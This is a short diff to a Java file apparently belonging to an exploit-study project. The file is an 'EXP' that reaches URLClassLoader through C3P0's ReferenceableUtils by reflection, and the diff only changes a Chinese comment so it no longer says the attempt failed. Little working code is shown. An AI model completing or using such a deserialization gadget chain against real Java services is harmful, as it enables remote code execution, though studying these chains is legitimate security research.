@@ -6,7 +6,7 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Hashtable;
 
-// 从 ReferenceableUtils 出发，调用 URLClassLoader 的 EXP (但是失败了
+// 从 ReferenceableUtils 出发，调用 URLClassLoader 的 EXP
 public class RefToURLClassLoader {
     public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NamingException, InstantiationException {
         Class clazz = Class.forName("com.mchange.v2.naming.ReferenceableUtils");
